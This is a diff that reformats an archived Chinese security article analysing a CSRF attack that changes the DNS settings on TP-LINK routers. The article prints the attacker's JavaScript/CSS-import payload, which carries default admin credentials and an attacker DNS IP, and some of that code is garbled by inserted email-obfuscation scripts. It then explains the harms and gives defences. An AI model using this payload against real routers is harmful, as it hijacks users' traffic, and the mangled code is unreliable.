@@ -3,14 +3,14 @@
 			<head>
 			     <title>针对TP-LINK的CSRF攻击来劫持DNS案例 - 瞌睡龙</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/722">http://drops.wooyun.org/papers/722</a></h1>
 				
       <p>
-        <h2>0x00 背景</h2>
+        </p><h2>0x00 背景</h2>
 
-<hr />
+<hr>
 
 <p>路由被CSRF攻击，修改DNS的话题最近一直比较活跃，但是国内貌似没有一个技术文章详细的分析此漏洞，漏洞成因比较简单，本篇来科普一下。</p>
 
@@ -20,7 +20,7 @@
 
 <h2>0x01 EXP分析</h2>
 
-<hr />
+<hr>
 
 <p>攻击者会在自己的网站或者已经受他控制的网站上加入一段javascript代码：</p>
 
@@ -45,12 +45,12 @@
 
 <p>代码最终等同于：</p>
 
-<pre><code>document.writeln('&lt;style type="text/css"&gt;@import url(http://admin:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f59491989c9bb5c4ccc7dbc4c3cddbc4dbc4">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&amp;ip1=192.168.1.100&amp;ip2=192.168.1.199&amp;Lease=120&amp;gateway=0.0.0.0&amp;domain=&amp;dnsserver=106.187.36.85&amp;dnsserver2=8.8.8.8&amp;Save=%B1%A3+%B4%E6);&lt;/style&gt;')
+<pre><code>document.writeln('&lt;style type="text/css"&gt;@import url(http://admin:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f59491989c9bb5c4ccc7dbc4c3cddbc4dbc4">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&amp;ip1=192.168.1.100&amp;ip2=192.168.1.199&amp;Lease=120&amp;gateway=0.0.0.0&amp;domain=&amp;dnsserver=106.187.36.85&amp;dnsserver2=8.8.8.8&amp;Save=%B1%A3+%B4%E6);&lt;/style&gt;')
 </code></pre>
 
 <p>现在就很明了了，写了一个style标签import一个css调用，让浏览器去访问这个地址：</p>
 
-<pre><code>http://admin:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d4b5b0b9bdba94e5ede6fae5e2ecfae5fae5">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&amp;ip1=192.168.1.100&amp;ip2=192.168.1.199&amp;Lease=120&amp;gateway=0.0.0.0&amp;domain=&amp;dnsserver=106.187.36.85&amp;dnsserver2=8.8.8.8&amp;Save=%B1%A3+%B4%E6
+<pre><code>http://admin:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d4b5b0b9bdba94e5ede6fae5e2ecfae5fae5">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&amp;ip1=192.168.1.100&amp;ip2=192.168.1.199&amp;Lease=120&amp;gateway=0.0.0.0&amp;domain=&amp;dnsserver=106.187.36.85&amp;dnsserver2=8.8.8.8&amp;Save=%B1%A3+%B4%E6
 </code></pre>
 
 <p>很明显的一个CSRF攻击，攻击者的主要目的是把dns服务器换成106.187.36.85，为了使攻击成功，还加入了一些必要的提交参数，如ip范围是从192.168.1.100-199等。</p>
@@ -65,7 +65,7 @@
 
 <h2>0x02 修改DNS的危害</h2>
 
-<hr />
+<hr>
 
 <p>攻击者为什么要修改DNS呢，当他获取DNS的权限后，他能做什么呢：</p>
 
@@ -78,13 +78,13 @@
 
 <h2>0x03 如何避免这种攻击</h2>
 
-<hr />
+<hr>
 
 <pre><code>1、首先应该先检查一下自己的dns是否已经被改变了。
 2、升级路由的固件，有部分型号已经修复。
 3、更改路由器的默认密码。
 4、登陆路由后，退出要点击“注销”。
-</code></pre>      </p>
+</code></pre>      <p></p>
     
 			</body>
 		</html>
